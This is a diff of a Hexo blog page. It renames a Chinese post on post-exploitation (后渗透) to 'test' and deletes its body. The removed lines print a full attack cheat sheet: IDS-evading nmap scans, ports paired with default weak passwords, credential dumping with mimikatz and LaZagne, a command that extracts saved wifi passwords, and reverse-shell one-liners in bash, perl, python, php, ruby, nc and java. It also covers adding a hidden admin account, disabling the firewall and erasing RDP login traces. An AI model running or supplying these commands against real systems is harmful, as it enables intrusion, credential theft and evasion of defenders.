@@ -6,19 +6,16 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>后渗透 | Hexo</title>
+  <title>test | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="后渗透基础设施分析内网扫描 nmap最高速全端口：1nmap -p 1-65535 -T4 -A --min-rate 2500 --max-retries 0    比较隐蔽：  -PS : nmap向目标主机发送一个设置了SYN标志位的空的TCP报文，不管主机返回SYN/ACK包还是RST包，它都认为该主机存活。不过虽然官方文档上说该参数只关心主机是否存活，不过在当前最新版本的nmap来看，这">
-<meta property="og:type" content="article">
-<meta property="og:title" content="后渗透">
-<meta property="og:url" content="http://yoursite.com/2019/08/19/后渗透/index.html">
+  <meta property="og:type" content="article">
+<meta property="og:title" content="test">
+<meta property="og:url" content="http://yoursite.com/2019/08/19/test/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="后渗透基础设施分析内网扫描 nmap最高速全端口：1nmap -p 1-65535 -T4 -A --min-rate 2500 --max-retries 0    比较隐蔽：  -PS : nmap向目标主机发送一个设置了SYN标志位的空的TCP报文，不管主机返回SYN/ACK包还是RST包，它都认为该主机存活。不过虽然官方文档上说该参数只关心主机是否存活，不过在当前最新版本的nmap来看，这">
 <meta property="og:locale" content="zh">
-<meta property="og:updated_time" content="2019-08-19T08:57:32.050Z">
+<meta property="og:updated_time" content="2019-08-19T08:54:53.308Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="后渗透">
-<meta name="twitter:description" content="后渗透基础设施分析内网扫描 nmap最高速全端口：1nmap -p 1-65535 -T4 -A --min-rate 2500 --max-retries 0    比较隐蔽：  -PS : nmap向目标主机发送一个设置了SYN标志位的空的TCP报文，不管主机返回SYN/ACK包还是RST包，它都认为该主机存活。不过虽然官方文档上说该参数只关心主机是否存活，不过在当前最新版本的nmap来看，这">
+<meta name="twitter:title" content="test">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -154,19 +151,19 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-后渗透" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-test" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      后渗透
+      test
     </h1>
   
 
         
-        <a href="/2019/08/19/后渗透/" class="archive-article-date">
+        <a href="/2019/08/19/test/" class="archive-article-date">
   	<time datetime="2019-08-19T08:54:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-19</time>
 </a>
         
@@ -174,180 +171,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><h2 id="基础设施分析"><a href="#基础设施分析" class="headerlink" title="基础设施分析"></a>基础设施分析</h2><h3 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h3><ul>
-<li>nmap<br>最高速全端口：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-65535 -T4 -A --min-rate 2500 --max-retries 0</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>比较隐蔽：</p>
-<ul>
-<li>-PS : nmap向目标主机发送一个设置了SYN标志位的空的TCP报文，不管主机返回SYN/ACK包还是RST包，它都认为该主机存活。不过虽然官方文档上说该参数只关心主机是否存活，不过在当前最新版本的nmap来看，这个命令也对主机的各个端口进行了探测。</li>
-<li>-sS:进行TCP SYN扫描，这个选项返回的结果与-PS返回的结果很像，它们两个参数的区别就是，-sS会发送一个ICMP包给目标主机          </li>
-</ul>
-<p>躲避IDS和IPS</p>
-<ul>
-<li>-mtu 8 发送大小为8字节的探针包躲避入侵检测</li>
-<li>-D ip1，ip2，ip3(发送假ip地址的探测包欺骗入侵检测)</li>
-<li>–source-port 54 指定特定的源端口发送侦测数据包</li>
-<li>–randomize-hosts 10.10.10.1-254 让扫描顺序随机化而不是顺序扫描<a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">25 SMTP </span><br><span class="line">53 DNS </span><br><span class="line">69 TFTP </span><br><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">110 POP3 </span><br><span class="line">135 RPC </span><br><span class="line">139 NETBIOS </span><br><span class="line">143 IMAP </span><br><span class="line">161 SNMP </span><br><span class="line">389 LDAP </span><br><span class="line">443 SSL心脏滴血以及一些web漏洞测试 </span><br><span class="line">445 SMB </span><br><span class="line">512,513,514 Rexec </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">1025,111 NFS </span><br><span class="line">1080 socks </span><br><span class="line">1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案 </span><br><span class="line">1433 MSSQL (暴力破解) </span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line">2082/2083 cpanel主机管理系统登陆 （国外用较多） </span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外用较多） </span><br><span class="line">2601,2604 zebra路由，默认密码zebra </span><br><span class="line">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </span><br><span class="line">3306 MySQL （暴力破解） </span><br><span class="line">3312/3311 kangle主机管理系统登陆 </span><br><span class="line">3389 远程桌面 </span><br><span class="line">3690 svn </span><br><span class="line">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </span><br><span class="line">4848 GlassFish web中间件 弱口令:admin/adminadmin </span><br><span class="line">5432 PostgreSQL </span><br><span class="line">5900 vnc </span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">7778 Kloxo主机控制面板登录 </span><br><span class="line">8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </span><br><span class="line">8080 tomcat/WDCd/ 主机管理系统，默认弱口令 </span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line">8081 Symantec AV/Filter for MSE </span><br><span class="line">8083 Vestacp主机管理系统 （国外用较多） </span><br><span class="line">8649 ganglia </span><br><span class="line">8888 amh/LuManager 主机管理系统默认端口 </span><br><span class="line">9000 fcgi fcig php执行 </span><br><span class="line">9043 websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">10000 Virtualmin/Webmin 服务器虚拟主机管理系统 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">28017 mongodb统计页面 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50060 hadoop </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><ul>
-<li><p>Ping探测 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt; for /L %I in (1,1,254) do ping -w 30 -n 1 192.168.1.%I | find “回复” &gt;&gt; 输出.txt</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看路由表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看连接信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看共享资源列表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看管理员登录ip</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>域传送漏洞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">server=ns.xx.com</span><br><span class="line">ls xx.com</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><ul>
-<li><p>Ping探测</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ip in $(seq 1 254); do ping -c1 -w2 192.168.1.$ip&gt;/dev/null; [ $? -eq 0 ] &amp;&amp; echo &quot;192.168.1.$ip UP&quot; || : ; done</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看路由表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route -n</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看连接信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>域传送漏洞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @ns.xxx.com axfr xxx.com</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>msf scanner</p>
-</li>
-<li><p><a href="https://note.youdao.com/" target="_blank" rel="noopener">arp-scan </a></p>
-</li>
-<li><p><a href="https://note.youdao.com/" target="_blank" rel="noopener">nessus</a></p>
-</li>
-</ul>
-<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><ul>
-<li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a><br>打补丁不成功的话尝试这个脚本<br><a href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed" target="_blank" rel="noopener">Dump-Clear-Text-Password-after-KB2871997-installed</a></li>
-<li>GetPass_32.exe</li>
-<li>GetPass_64.exe</li>
-<li><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">laZagne</a>可导出浏览器，wifi，mail等的账号密码</li>
-<li>键盘记录</li>
-<li>查看所有保存的wifi密码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan show profiles&apos;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure>
-
-
-</li>
-</ul>
-<h3 id="令牌伪造"><a href="#令牌伪造" class="headerlink" title="令牌伪造"></a>令牌伪造</h3><ul>
-<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1" target="_blank" rel="noopener">powershell</a></li>
-<li><a href="https://github.com/foxglovesec/RottenPotato" target="_blank" rel="noopener">RottenPotato</a></li>
-</ul>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">反弹shell</a></h3><p>Bash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p>PERL</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
-
-<p>Python</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
-
-<p>PHP</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
-
-<p>Ruby</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br></pre></td></tr></table></figure>
-
-<p>NC</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br></pre></td></tr></table></figure>
-
-<p>If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
-
-<p>Java</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
-
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul>
-<li><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">windows</a></p>
-</li>
-<li><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">linux</a></p>
-</li>
-<li><p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">linux提权辅助</a></p>
-<h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3></li>
-<li><p><a href="https://www.shellterproject.com/download/" target="_blank" rel="noopener">shellter</a></p>
-</li>
-<li><p><a href="https://www.cnblogs.com/k8gege/p/10261491.html" target="_blank" rel="noopener">K8_SC_ENCODE</a></p>
-</li>
-<li><p><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">the-backdoor-factory</a> 给软件捆绑后门</p>
-</li>
-<li><p><a href="https://github.com/Screetsec/TheFatRat" target="_blank" rel="noopener">便捷化payload生成</a></p>
-</li>
-<li><p><a href="https://github.com/Veil-Framework/Veil-Evasion" target="_blank" rel="noopener">Veil-Evasion </a><br>Veil-Evasion是与Metasploit生成相兼容的Payload的一款辅助框架，并可以绕过大多数的杀软</p>
-</li>
-<li><p><a href="https://github.com/Veil-Framework/Veil" target="_blank" rel="noopener">Veil-Evasion不在更新，新版本veil</a></p>
-</li>
-<li><p><a href="https://github.com/GreatSCT/GreatSCT" target="_blank" rel="noopener">GreatSCT是以metasploit payload为核心，白名单辅助payload执行框架</a></p>
-</li>
-</ul>
-<h3 id="维持权限"><a href="#维持权限" class="headerlink" title="维持权限"></a>维持权限</h3><p>参考micro8</p>
-<ul>
-<li>本地后门：如系统后门，这里指的是装机后自带的某 功能或者自带软件后门 </li>
-<li>本地拓展后门：如iis 6的isapi，iis7的 模块后门 </li>
-<li>第三方后门：如apache，serv-u，第三方软件后门 </li>
-<li>第三方扩展后门：如php扩展后门，apache扩展后 门，第三方扩展后门 </li>
-<li>人为化后门：一般指被动后门，由人为引起触发导致 激活，或者传播，如经典的shift后门</li>
-</ul>
-<h3 id="掠夺敏感信息"><a href="#掠夺敏感信息" class="headerlink" title="掠夺敏感信息"></a>掠夺敏感信息</h3><h4 id="windows："><a href="#windows：" class="headerlink" title="windows："></a>windows：</h4><ul>
-<li><a href="https://www.voidtools.com/zh-cn/downloads/" target="_blank" rel="noopener">everything搜索文件</a>（搜全盘文件，TXT，Excel，word）</li>
-<li>有道笔记</li>
-<li>印象笔记</li>
-<li>浏览器保存的账号密码和历史记录</li>
-<li>备份文件</li>
-<li>数据库等敏感配置文件</li>
-<li>回收站<h4 id="网段中"><a href="#网段中" class="headerlink" title="网段中"></a>网段中</h4></li>
-<li>利用内网dns来获取子域名</li>
-<li>共享文件</li>
-<li>nas（大部分在5000，5001端口，可通过端口扫描发现）</li>
-<li>gitlab</li>
-<li>svn</li>
-<li>打印机</li>
-<li>考勤系统</li>
-<li>监控系统</li>
-<li></li>
-</ul>
-<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>端口爆破：<br><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">hydra</a></p>
-<p>SSH用户名爆破<a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit" target="_blank" rel="noopener">CVE-2018-15473</a></p>
-<p>ms17-010：</p>
-<p>msf扫描：auxiliary/scanner/smb/smb_ms17_010</p>
-<p>利用：exploit/windows/smb/ms17_010_eternalblue       </p>
-<p><a href="https://blog.csdn.net/fly_hps/article/details/80937837" target="_blank" rel="noopener">redis未授权访问</a></p>
-<p>注册表开3389：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
-
-<p>注册表查看远程桌面端口是多少（结果是16进制的）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</span><br></pre></td></tr></table></figure>
-
-<p>添加用户</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user admin1 admin1 /add &amp; net localgroup administrators admin1 /add</span><br></pre></td></tr></table></figure>
-
-<p>添加允许3389到防火墙</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>
-
-<p>关闭防火墙</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode mode=disable</span><br></pre></td></tr></table></figure>
-
-<p><a href="http://www.myh0st.cn/index.php/archives/230/" target="_blank" rel="noopener">内网中间人攻击</a></p>
-<p>3389登录记录清除</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f</span><br><span class="line">@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; /a</span><br><span class="line">@exit</span><br></pre></td></tr></table></figure>
-
-<h3 id="传输文件技巧"><a href="#传输文件技巧" class="headerlink" title="传输文件技巧"></a><a href="https://paper.seebug.org/834/" target="_blank" rel="noopener">传输文件技巧</a></h3>
+        
       
 
       
@@ -426,7 +250,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/19/后渗透/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/19/test/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -440,15 +264,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/08/19/信息收集/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          信息收集
-        
-      </div>
-    </a>
   
+    <a href="/2019/08/19/信息收集/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">信息收集</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
